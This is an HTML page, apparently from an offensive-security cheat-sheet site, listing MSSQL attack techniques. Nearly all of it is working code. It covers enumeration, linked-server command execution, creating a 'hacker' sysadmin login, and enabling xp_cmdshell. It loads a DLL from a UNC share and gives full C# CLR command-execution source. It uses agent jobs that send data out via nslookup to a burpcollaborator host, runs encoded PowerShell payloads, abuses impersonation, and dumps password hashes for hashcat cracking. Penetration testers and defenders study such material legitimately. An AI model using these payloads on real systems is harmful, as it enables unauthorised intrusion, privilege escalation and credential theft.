+<li><a href="#execute-commands-using-clr-assembly">Execute commands using CLR assembly</a></li>
+<li><a href="#manually-creating-a-clr-dll-and-importing-it">Manually creating a CLR DLL and importing it</a></li>
+</ul>
+</li>
+<li><a href="#ole-automation">OLE Automation</a><ul>
+<li><a href="#execute-commands-using-ole-automation-procedures">Execute commands using OLE automation procedures</a></li>
+</ul>
+</li>
+<li><a href="#agent-jobs">Agent Jobs</a><ul>
+<li><a href="#execute-commands-through-sql-agent-job-service">Execute commands through SQL Agent Job service</a></li>
+<li><a href="#list-all-jobs">List All Jobs</a></li>
+</ul>
+</li>
+<li><a href="#external-scripts">External Scripts</a><ul>
+<li><a href="#python">Python</a></li>
+<li><a href="#r">R</a></li>
+</ul>
+</li>
+<li><a href="#audit-checks">Audit Checks</a><ul>
+<li><a href="#find-and-exploit-impersonation-opportunities">Find and exploit impersonation opportunities</a> </li>
+</ul>
+</li>
+<li><a href="#find-databases-that-have-been-configured-as-trustworthy">Find databases that have been configured as trustworthy</a></li>
+<li><a href="#manual-sql-server-queries">Manual SQL Server Queries</a><ul>
+<li><a href="#query-current-user--determine-if-the-user-is-a-sysadmin">Query Current User &amp; determine if the user is a sysadmin</a></li>
+<li><a href="#current-role">Current Role</a></li>
+<li><a href="#current-db">Current DB</a></li>
+<li><a href="#list-all-tables">List all tables</a></li>
+<li><a href="#list-all-databases">List all databases</a></li>
+<li><a href="#all-logins-on-server">All Logins on Server</a></li>
+<li><a href="#all-database-users-for-a-database">All Database Users for a Database</a> </li>
+<li><a href="#list-all-sysadmins">List All Sysadmins</a></li>
+<li><a href="#list-all-database-role">List All Database Roles</a></li>
+<li><a href="#effective-permissions-from-the-server">Effective Permissions from the Server</a></li>
+<li><a href="#effective-permissions-from-the-database">Effective Permissions from the Database</a></li>
+<li><a href="#find-sql-server-logins-which-can-be-impersonated-for-the-current-database">Find SQL Server Logins Which can be Impersonated for the Current Database</a></li>
+<li><a href="#exploiting-impersonation">Exploiting Impersonation</a></li>
+<li><a href="#exploiting-nested-impersonation">Exploiting Nested Impersonation</a></li>
+<li><a href="#mssql-accounts-and-hashes">MSSQL Accounts and Hashes</a></li>
+</ul>
+</li>
+<li><a href="#references">References</a></li>
+</ul>
+<h2 id="identify-instances-and-databases">Identify Instances and Databases</h2>
+<h3 id="discover-local-sql-server-instances">Discover Local SQL Server Instances</h3>
+<pre><code class="language-ps1">Get-SQLInstanceLocal
+</code></pre>
+<h3 id="discover-domain-sql-server-instances">Discover Domain SQL Server Instances</h3>
+<pre><code class="language-ps1">Get-SQLInstanceDomain -Verbose
+# Get Server Info for Found Instances
+Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
+# Get Database Names
+Get-SQLInstanceDomain | Get-SQLDatabase -NoDefaults
+</code></pre>
+<h3 id="discover-remote-sql-server-instances">Discover Remote SQL Server Instances</h3>
+<pre><code class="language-ps1">Get-SQLInstanceBroadcast -Verbose
+Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1
+</code></pre>
+<h3 id="identify-encrypted-databases">Identify Encrypted databases</h3>
+<p>Note: These are automatically decrypted for admins</p>
+<pre><code class="language-ps1">Get-SQLDatabase -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Verbose | Where-Object {$_.is_encrypted -eq &quot;True&quot;}
+</code></pre>
+<h3 id="version-query">Version Query</h3>
+<pre><code class="language-ps1">Get-SQLInstanceDomain | Get-Query &quot;select @@version&quot;
+</code></pre>
+<h2 id="identify-sensitive-information">Identify Sensitive Information</h2>
+<h3 id="get-tables-from-a-specific-database">Get Tables from a Specific Database</h3>
+<pre><code class="language-ps1">Get-SQLInstanceDomain | Get-SQLTable -DatabaseName &lt;DBNameFromGet-SQLDatabaseCommand&gt; -NoDefaults
+Get Column Details from a Table
+Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName &lt;DBName&gt; -TableName &lt;TableName&gt;
+</code></pre>
+<h3 id="gather-5-entries-from-each-column">Gather 5 Entries from Each Column</h3>
+<pre><code class="language-ps1">Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords &quot;&lt;columnname1,columnname2,columnname3,columnname4,columnname5&gt;&quot; -Verbose -SampleSize 5
+</code></pre>
+<h3 id="gather-5-entries-from-a-specific-table">Gather 5 Entries from a Specific Table</h3>
+<pre><code class="language-ps1">Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query 'select TOP 5 * from &lt;DatabaseName&gt;.dbo.&lt;TableName&gt;'
+</code></pre>
+<h3 id="dump-common-information-from-server-to-files">Dump common information from server to files</h3>
+<pre><code class="language-ps1">Invoke-SQLDumpInfo -Verbose -Instance SQLSERVER1\Instance1 -csv
+</code></pre>
+<h2 id="linked-database">Linked Database</h2>
+<h3 id="find-trusted-link">Find Trusted Link</h3>
+<pre><code class="language-sql">select * from master..sysservers
+</code></pre>
+<h3 id="execute-query-through-the-link">Execute Query Through The Link</h3>
+<pre><code class="language-sql">-- execute query through the link
+select * from openquery(&quot;dcorp-sql1&quot;, 'select * from master..sysservers')
+select version from openquery(&quot;linkedserver&quot;, 'select @@version as version');
+
+-- chain multiple openquery
+select version from openquery(&quot;link1&quot;,'select version from openquery(&quot;link2&quot;,&quot;select @@version as version&quot;)')
+
+-- execute shell commands
+EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
+select 1 from openquery(&quot;linkedserver&quot;,'select 1;exec master..xp_cmdshell &quot;dir c:&quot;')
+
+-- create user and give admin privileges
+EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT &quot;DOMINIO\SERVER1&quot;') AT &quot;DOMINIO\SERVER2&quot;
+EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT &quot;DOMINIO\SERVER1&quot;') AT &quot;DOMINIO\SERVER2&quot;
+</code></pre>
+<h3 id="crawl-links-for-instances-in-the-domain">Crawl Links for Instances in the Domain</h3>
+<p>A Valid Link Will Be Identified by the DatabaseLinkName Field in the Results</p>
+<pre><code class="language-ps1">Get-SQLInstanceDomain | Get-SQLServerLink -Verbose
+select * from master..sysservers
+</code></pre>
+<h3 id="crawl-links-for-a-specific-instance">Crawl Links for a Specific Instance</h3>
+<pre><code class="language-ps1">Get-SQLServerLinkCrawl -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Verbose
+select * from openquery(&quot;&lt;instance&gt;&quot;,'select * from openquery(&quot;&lt;instance2&gt;&quot;,''select * from master..sysservers'')')
+</code></pre>
+<h3 id="query-version-of-linked-database">Query Version of Linked Database</h3>
+<pre><code class="language-ps1">Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;select * from openquery(`&quot;&lt;DBSERVERNAME\DBInstance&gt;`&quot;,'select @@version')&quot; -Verbose
+</code></pre>
+<h3 id="execute-procedure-on-linked-database">Execute Procedure on Linked Database</h3>
+<pre><code class="language-ps1">SQL&gt; EXECUTE('EXEC sp_configure ''show advanced options'',1') at &quot;linked.database.local&quot;;
+SQL&gt; EXECUTE('RECONFIGURE') at &quot;linked.database.local&quot;;
+SQL&gt; EXECUTE('EXEC sp_configure ''xp_cmdshell'',1;') at &quot;linked.database.local&quot;;
+SQL&gt; EXECUTE('RECONFIGURE') at &quot;linked.database.local&quot;;
+SQL&gt; EXECUTE('exec xp_cmdshell whoami') at &quot;linked.database.local&quot;;
+</code></pre>
+<h3 id="determine-names-of-linked-databases">Determine Names of Linked Databases</h3>
+<blockquote>
+<p>tempdb, model ,and msdb are default databases usually not worth looking into. Master is also default but may have something and anything else is custom and definitely worth digging into. The result is DatabaseName which feeds into following query.</p>
+</blockquote>
+<pre><code class="language-ps1">Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;select * from openquery(`&quot;&lt;DatabaseLinkName&gt;`&quot;,'select name from sys.databases')&quot; -Verbose
+</code></pre>
+<h3 id="determine-all-the-tables-names-from-a-selected-linked-database">Determine All the Tables Names from a Selected Linked Database</h3>
+<blockquote>
+<p>The result is TableName which feeds into following query</p>
+</blockquote>
+<pre><code class="language-ps1">Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;select * from openquery(`&quot;&lt;DatabaseLinkName&gt;`&quot;,'select name from &lt;DatabaseNameFromPreviousCommand&gt;.sys.tables')&quot; -Verbose
+</code></pre>
+<h3 id="gather-the-top-5-columns-from-a-selected-linked-table">Gather the Top 5 Columns from a Selected Linked Table</h3>
+<blockquote>
+<p>The results are ColumnName and ColumnValue which feed into following query</p>
+</blockquote>
+<pre><code class="language-ps1">Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;select * from openquery(`&quot;&lt;DatabaseLinkName&gt;`&quot;,'select TOP 5 * from &lt;DatabaseNameFromPreviousCommand&gt;.dbo.&lt;TableNameFromPreviousCommand&gt;')&quot; -Verbose
+</code></pre>
+<h3 id="gather-entries-from-a-selected-linked-column">Gather Entries from a Selected Linked Column</h3>
+<pre><code class="language-ps1">Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;select * from openquery(`&quot;&lt;DatabaseLinkName&gt;`&quot;'select * from &lt;DatabaseNameFromPreviousCommand&gt;.dbo.&lt;TableNameFromPreviousCommand&gt; where &lt;ColumnNameFromPreviousCommand&gt;=&lt;ColumnValueFromPreviousCommand&gt;')&quot; -Verbose
+</code></pre>
+<h2 id="command-execution-via-xp_cmdshell">Command Execution via xp_cmdshell</h2>
+<blockquote>
+<p>xp_cmdshell disabled by default since SQL Server 2005</p>
+</blockquote>
+<pre><code class="language-ps1">PowerUpSQL&gt; Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command whoami
+
+# Creates and adds local user backup to the local administrators group:
+PowerUpSQL&gt; Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;net user backup Password1234 /add'&quot; -Verbose
+PowerUpSQL&gt; Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;net localgroup administrators backup /add&quot; -Verbose
+</code></pre>
+<ul>
+<li>Manually execute the SQL query
+    <code>sql
+    EXEC xp_cmdshell "net user";
+    EXEC master..xp_cmdshell 'whoami'
+    EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
+    EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';</code></li>
+<li>If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005)
+    <code>sql
+    EXEC sp_configure 'show advanced options',1;
+    RECONFIGURE;
+    EXEC sp_configure 'xp_cmdshell',1;
+    RECONFIGURE;</code></li>
+<li>If the procedure was uninstalled
+    <code>sql
+    sp_addextendedproc 'xp_cmdshell','xplog70.dll'</code></li>
+</ul>
+<h2 id="extended-stored-procedure">Extended Stored Procedure</h2>
+<h3 id="add-the-extended-stored-procedure-and-list-extended-stored-procedures">Add the extended stored procedure and list extended stored procedures</h3>
+<pre><code class="language-ps1"># Create evil DLL
+Create-SQLFileXpDll -OutFile C:\temp\test.dll -Command &quot;echo test &gt; c:\temp\test.txt&quot; -ExportName xp_test
+
+# Load the DLL and call xp_test
+Get-SQLQuery -UserName sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;sp_addextendedproc 'xp_test', '\\10.10.0.1\temp\test.dll'&quot;
+Get-SQLQuery -UserName sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;EXEC xp_test&quot;
+
+# Listing existing
+Get-SQLStoredProcedureXP -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Verbose
+</code></pre>
+<ul>
+<li>Build a DLL using <a href="https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp">xp_evil_template.cpp</a></li>
+<li>Load the DLL
+    <code>sql
+    -- can also be loaded from UNC path or Webdav
+    sp_addextendedproc 'xp_calc', 'C:\mydll\xp_calc.dll'
+    EXEC xp_calc
+    sp_dropextendedproc 'xp_calc'</code></li>
+</ul>
+<h2 id="clr-assemblies">CLR Assemblies</h2>
+<p>Prerequisites:
+* sysadmin privileges
+* CREATE ASSEMBLY permission (or)
+* ALTER ASSEMBLY permission (or)</p>
+<p>The execution takes place with privileges of the <strong>service account</strong>.</p>
+<h3 id="execute-commands-using-clr-assembly">Execute commands using CLR assembly</h3>
+<pre><code class="language-ps1"># Create C# code for the DLL, the DLL and SQL query with DLL as hexadecimal string
+Create-SQLFileCLRDll -ProcedureName &quot;runcmd&quot; -OutFile runcmd -OutDir C:\Users\user\Desktop
+
+# Execute command using CLR assembly
+Invoke-SQLOSCmdCLR -Username sa -Password &lt;password&gt; -Instance &lt;instance&gt; -Command &quot;whoami&quot; -Verbose
+Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;whoami&quot; Verbose
+Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;powershell -e &lt;base64&gt;&quot; -Verbose
+
+# List all the stored procedures added using CLR
+Get-SQLStoredProcedureCLR -Instance &lt;instance&gt; -Verbose
+</code></pre>
+<h3 id="manually-creating-a-clr-dll-and-importing-it">Manually creating a CLR DLL and importing it</h3>
+<p>Create a C# DLL file with the following content, with the command : <code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library c:\temp\cmd_exec.cs</code></p>
+<pre><code class="language-csharp">using System;
+using System.Data;
+using System.Data.SqlClient;
+using System.Data.SqlTypes;
+using Microsoft.SqlServer.Server;
+using System.IO;
+using System.Diagnostics;
+using System.Text;
+
+public partial class StoredProcedures
+{
+    [Microsoft.SqlServer.Server.SqlProcedure]
+    public static void cmd_exec (SqlString execCommand)
+    {
+        Process proc = new Process();
+        proc.StartInfo.FileName = @&quot;C:\Windows\System32\cmd.exe&quot;;
+        proc.StartInfo.Arguments = string.Format(@&quot; /C {0}&quot;, execCommand.Value);
+        proc.StartInfo.UseShellExecute = false;
+        proc.StartInfo.RedirectStandardOutput = true;
+        proc.Start();
+
+        // Create the record and specify the metadata for the columns.
+        SqlDataRecord record = new SqlDataRecord(new SqlMetaData(&quot;output&quot;, SqlDbType.NVarChar, 4000));
+
+        // Mark the beginning of the result set.
+        SqlContext.Pipe.SendResultsStart(record);
+
+        // Set values for each column in the row
+        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
+
+        // Send the row back to the client.
+        SqlContext.Pipe.SendResultsRow(record);
+
+        // Mark the end of the result set.
+        SqlContext.Pipe.SendResultsEnd();
+
+        proc.WaitForExit();
+        proc.Close();
+    }
+};
+</code></pre>
+<p>Then follow these instructions:</p>
+<ol>
+<li>Enable <code>show advanced options</code> on the server
+    <code>sql
+    sp_configure 'show advanced options',1; 
+    RECONFIGURE
+    GO</code></li>
+<li>Enable CLR on the server
+    <code>sql
+    sp_configure 'clr enabled',1
+    RECONFIGURE
+    GO</code></li>
+<li>Import the assembly
+    <code>sql
+    CREATE ASSEMBLY my_assembly
+    FROM 'c:\temp\cmd_exec.dll'
+    WITH PERMISSION_SET = UNSAFE;</code></li>
+<li>Link the assembly to a stored procedure
+    <code>sql
+    CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];
+    GO</code></li>
+<li>Execute and clean
+    <code>sql
+    cmd_exec "whoami"
+    DROP PROCEDURE cmd_exec
+    DROP ASSEMBLY my_assembly</code></li>
+</ol>
+<p><strong>CREATE ASSEMBLY</strong> will also accept an hexadecimal string representation of a CLR DLL</p>
+<pre><code class="language-sql">CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM 
+0x4D5A90000300000004000000F[TRUNCATED]
+WITH PERMISSION_SET = UNSAFE 
+GO 
+</code></pre>
+<h2 id="ole-automation">OLE Automation</h2>
+<ul>
+<li>:warning: Disabled by default</li>
+<li>The execution takes place with privileges of the <strong>service account</strong>.</li>
+</ul>
+<h3 id="execute-commands-using-ole-automation-procedures">Execute commands using OLE automation procedures</h3>
+<pre><code class="language-ps1">Invoke-SQLOSCmdOle -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;whoami&quot; Verbose
+</code></pre>
+<pre><code class="language-ps1"># Enable OLE Automation
+EXEC sp_configure 'show advanced options', 1
+EXEC sp_configure reconfigure
+EXEC sp_configure 'OLE Automation Procedures', 1
+EXEC sp_configure reconfigure
+
+# Execute commands
+DECLARE @execmd INT
+EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT
+EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c'
+</code></pre>
+<pre><code class="language-powershell"># https://github.com/blackarrowsec/mssqlproxy/blob/master/mssqlclient.py
+python3 mssqlclient.py 'host/username:password@10.10.10.10' -install -clr Microsoft.SqlServer.Proxy.dll
+python3 mssqlclient.py 'host/username:password@10.10.10.10' -check -reciclador 'C:\windows\temp\reciclador.dll'
+python3 mssqlclient.py 'host/username:password@10.10.10.10' -start -reciclador 'C:\windows\temp\reciclador.dll'
+SQL&gt; enable_ole
+SQL&gt; upload reciclador.dll C:\windows\temp\reciclador.dll
+</code></pre>
+<h2 id="agent-jobs">Agent Jobs</h2>
+<ul>
+<li>The execution takes place with privileges of the <strong>SQL Server Agent service account</strong> if a proxy account is not configured.</li>
+<li>:warning: Require <strong>sysadmin</strong> or <strong>SQLAgentUserRole</strong>, <strong>SQLAgentReaderRole</strong>, and <strong>SQLAgentOperatorRole</strong> roles to create a job.</li>
+</ul>
+<h3 id="execute-commands-through-sql-agent-job-service">Execute commands through SQL Agent Job service</h3>
+<pre><code class="language-ps1">Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;powershell e &lt;base64encodedscript&gt;&quot; -Verbose
+Subsystem Options:
+–Subsystem CmdExec
+-SubSystem PowerShell
+–Subsystem VBScript
+–Subsystem Jscript
+</code></pre>
+<pre><code class="language-sql">USE msdb; 
+EXEC dbo.sp_add_job @job_name = N'test_powershell_job1'; 
+EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'$name=$env:COMPUTERNAME[10];nslookup &quot;$name.redacted.burpcollaborator.net&quot;', @retry_attempts = 1, @retry_interval = 5 ;
+EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; 
+EXEC dbo.sp_start_job N'test_powershell_job1';
+
+-- delete
+EXEC dbo.sp_delete_job @job_name = N'test_powershell_job1';
+</code></pre>
+<h3 id="list-all-jobs">List All Jobs</h3>
+<pre><code class="language-ps1">SELECT job_id, [name] FROM msdb.dbo.sysjobs;
+SELECT job.job_id, notify_level_email, name, enabled, description, step_name, command, server, database_name FROM msdb.dbo.sysjobs job INNER JOIN msdb.dbo.sysjobsteps steps ON job.job_id = steps.job_id
+Get-SQLAgentJob -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -username sa -Password Password1234 -Verbose
+</code></pre>
+<h2 id="external-scripts">External Scripts</h2>
+<p>:warning: You need to enable <strong>external scripts</strong>.</p>
+<pre><code class="language-sql">sp_configure 'external scripts enabled', 1;
+RECONFIGURE;
+</code></pre>
+<h2 id="python">Python:</h2>
+<pre><code class="language-ps1">Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;powershell -e &lt;base64encodedscript&gt;&quot; -Verbose
+
+EXEC sp_execute_external_script @language =N'Python',@script=N'import subprocess p = subprocess.Popen(&quot;cmd.exe /c whoami&quot;, stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), &quot;utf-8&quot;)])'
+WITH RESULT SETS (([cmd_out] nvarchar(max)))
+</code></pre>
+<h2 id="r">R</h2>
+<pre><code class="language-ps1">Invoke-SQLOSCmdR -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Command &quot;powershell -e &lt;base64encodedscript&gt;&quot; -Verbose
+
+EXEC sp_execute_external_script @language=N'R',@script=N'OutputDataSet &lt;- data.frame(system(&quot;cmd.exe /c dir&quot;,intern=T))'
+WITH RESULT SETS (([cmd_out] text));
+GO
+
+@script=N'OutputDataSet &lt;-data.frame(shell(&quot;dir&quot;,intern=T))'
+</code></pre>
+<h2 id="audit-checks">Audit Checks</h2>
+<h3 id="find-and-exploit-impersonation-opportunities">Find and exploit impersonation opportunities</h3>
+<ul>
+<li>Impersonate as: <code>EXECUTE AS LOGIN = 'sa'</code></li>
+<li>Impersonate <code>dbo</code> with DB_OWNER
+    <code>sql
+    SQL&gt; select is_member('db_owner');
+    SQL&gt; execute as user = 'dbo'
+    SQL&gt; SELECT is_srvrolemember('sysadmin')</code></li>
+</ul>
+<pre><code class="language-ps1">Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Exploit -Verbose
+
+# impersonate sa account
+powerpick Get-SQLQuery -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Query &quot;EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER(''sysadmin'')&quot; -Verbose -Debug
+</code></pre>
+<h2 id="find-databases-that-have-been-configured-as-trustworthy">Find databases that have been configured as trustworthy</h2>
+<pre><code class="language-sql">Invoke-SQLAuditPrivTrustworthy -Instance &quot;&lt;DBSERVERNAME\DBInstance&gt;&quot; -Exploit -Verbose 
+
+SELECT name as database_name, SUSER_NAME(owner_sid) AS database_owner, is_trustworthy_on AS TRUSTWORTHY from sys.databases
+</code></pre>
+<blockquote>
+<p>The following audit checks run web requests to load Inveigh via reflection. Be mindful of the environment and ability to connect outbound.</p>
+</blockquote>
+<pre><code class="language-ps1">Invoke-SQLAuditPrivXpDirtree
+Invoke-SQLUncPathInjection
+Invoke-SQLAuditPrivXpFileexist
+</code></pre>
+<h2 id="manual-sql-server-queries">Manual SQL Server Queries</h2>
+<h3 id="query-current-user-determine-if-the-user-is-a-sysadmin">Query Current User &amp; determine if the user is a sysadmin</h3>
+<pre><code class="language-sql">select suser_sname()
+Select system_user
+select is_srvrolemember('sysadmin')
+</code></pre>
+<h3 id="current-role">Current Role</h3>
+<pre><code class="language-sql">Select user
+</code></pre>
+<h3 id="current-db">Current DB</h3>
+<pre><code class="language-sql">select db_name()
+</code></pre>
+<h3 id="list-all-tables">List all tables</h3>
+<pre><code class="language-sql">select table_name from information_schema.tables
+</code></pre>
+<h3 id="list-all-databases">List all databases</h3>
+<pre><code class="language-sql">select name from master..sysdatabases
+</code></pre>
+<h3 id="all-logins-on-server">All Logins on Server</h3>
+<pre><code class="language-sql">Select * from sys.server_principals where type_desc != 'SERVER_ROLE'
+</code></pre>
+<h3 id="all-database-users-for-a-database">All Database Users for a Database</h3>
+<pre><code class="language-sql">Select * from sys.database_principals where type_desc != 'database_role';
+</code></pre>
+<h3 id="list-all-sysadmins">List All Sysadmins</h3>
+<pre><code class="language-sql">SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name) = 1
+</code></pre>
+<h3 id="list-all-database-roles">List All Database Roles</h3>
+<pre><code class="language-sql">SELECT DB1.name AS DatabaseRoleName,
+isnull (DB2.name, 'No members') AS DatabaseUserName
+FROM sys.database_role_members AS DRM
+RIGHT OUTER JOIN sys.database_principals AS DB1
+ON DRM.role_principal_id = DB1.principal_id
+LEFT OUTER JOIN sys.database_principals AS DB2
+ON DRM.member_principal_id = DB2.principal_id
+WHERE DB1.type = 'R'
+ORDER BY DB1.name;
+</code></pre>
+<h3 id="effective-permissions-from-the-server">Effective Permissions from the Server</h3>
+<pre><code class="language-sql">select * from fn_my_permissions(null, 'server');
+</code></pre>
+<h3 id="effective-permissions-from-the-database">Effective Permissions from the Database</h3>
+<pre><code class="language-sql">SELECT * FROM fn_dp1my_permissions(NULL, 'DATABASE');
+</code></pre>
+<h3 id="find-sql-server-logins-which-can-be-impersonated-for-the-current-database">Find SQL Server Logins Which can be Impersonated for the Current Database</h3>
+<pre><code class="language-sql">select distinct b.name
+from sys.server_permissions a
+inner join sys.server_principals b
+on a.grantor_principal_id = b.principal_id
+where a.permission_name = 'impersonate'
+</code></pre>
+<h3 id="exploiting-impersonation">Exploiting Impersonation</h3>
+<pre><code class="language-sql">SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+EXECUTE AS LOGIN = 'adminuser'
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+SELECT ORIGINAL_LOGIN()
+</code></pre>
+<h3 id="exploiting-nested-impersonation">Exploiting Nested Impersonation</h3>
+<pre><code class="language-sql">SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+EXECUTE AS LOGIN = 'stduser'
+SELECT SYSTEM_USER
+EXECUTE AS LOGIN = 'sa'
+SELECT IS_SRVROLEMEMBER('sysadmin')
+SELECT ORIGINAL_LOGIN()
+SELECT SYSTEM_USER
+</code></pre>
+<h3 id="mssql-accounts-and-hashes">MSSQL Accounts and Hashes</h3>
+<pre><code class="language-sql">MSSQL 2000:
+SELECT name, password FROM master..sysxlogins
+SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.)
+
+MSSQL 2005
+SELECT name, password_hash FROM master.sys.sql_logins
+SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
+</code></pre>
+<p>Then crack passwords using Hashcat : <code>hashcat -m 1731 -a 0 mssql_hashes_hashcat.txt /usr/share/wordlists/rockyou.txt --force</code></p>
+<pre><code class="language-ps1">131 MSSQL (2000)    0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578
+132 MSSQL (2005)    0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe
+1731    MSSQL (2012, 2014)  0x02000102030434ea1b17802fd95ea6316bd61d2c94622ca3812793e8fb1672487b5c904a45a31b2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375
+</code></pre>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://medium.com/@D00MFist/powerupsql-cheat-sheet-sql-server-queries-40e1c418edc3">PowerUpSQL Cheat Sheet &amp; SQL Server Queries - Leo Pitt</a></li>
+<li><a href="https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet">PowerUpSQL Cheat Sheet - Scott Sutherland</a></li>
+<li><a href="https://blog.netspi.com/attacking-sql-server-clr-assemblies/">Attacking SQL Server CLR Assemblies - Scott Sutherland - July 13th, 2017</a></li>
+<li><a href="https://www.optiv.com/explore-optiv-insights/blog/mssql-agent-jobs-command-execution">MSSQL Agent Jobs for Command Execution - Nicholas Popovich - September 21, 2016</a></li>
+</ul>
+
+  <hr>
+<div class="md-source-file">
+  <small>
+    
+      Last update:
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">August 30, 2022</span>
+      
+    
+  </small>
+</div>
+
+
+
+
+              
+            </article>
+            
+          </div>
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+            Back to top
+          </a>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../Linux%20-%20Privilege%20Escalation/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Linux - Privilege Escalation" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Linux - Privilege Escalation
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../Metasploit%20-%20Cheatsheet/" class="md-footer__link md-footer__link--next" aria-label="Next: Metasploit" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              Metasploit
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
